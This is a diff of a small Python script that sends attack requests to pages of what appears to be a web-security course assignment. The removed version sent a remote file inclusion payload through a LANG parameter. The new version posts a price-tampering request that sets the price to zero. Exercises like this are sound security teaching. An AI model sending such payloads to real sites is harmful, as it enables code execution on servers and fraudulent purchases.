@@ -1,7 +1,7 @@
 import urllib, urllib2, cookielib, webbrowser, os
 
-url = "http://www.wsb.com/Assignment2/case03/case03.php"
-values = dict(LANG="http://www.wsb.com/Assignment2/rfi.txt.php")
+url = "http://www.wsb.com/Assignment2/case11.php"
+values = dict(qty="1",Price="0")
 data = urllib.urlencode(values)
 req = urllib2.Request(url, data)
 rsp = urllib2.urlopen(req)
@@ -11,5 +11,3 @@ fp = open(tmp_file, "w")
 fp.write(content)
 fp.close()
 webbrowser.open("file://" + os.path.realpath(tmp_file))
-
-# WORKS WITH BOTH LOCAL AND REMOTE FILE INCLUSION
